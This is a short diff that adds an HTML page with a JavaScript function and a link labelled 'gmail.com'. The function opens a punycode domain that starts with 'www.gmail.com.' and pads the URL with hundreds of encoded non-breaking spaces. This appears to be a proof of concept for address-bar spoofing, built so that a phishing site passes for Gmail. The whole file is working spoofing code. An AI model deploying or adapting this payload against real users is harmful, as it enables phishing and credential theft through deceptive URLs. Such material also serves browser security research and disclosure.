@@ -1,0 +1,11 @@
+<script>
+function spoof(){
+    var link = document.createElement('a');
+    link.href = 'http://www.gmail.com.xn--ggbla3j.xn--ngbc5azd/?'+Array(0x100).join("%C2%A0")+'%DB%B0';
+    link.target="aaaa";
+    document.body.appendChild(link);
+    link.click();
+}
+</script>
+
+<a onclick="spoof();" href="javascript:void(0);">gmail.com</a>
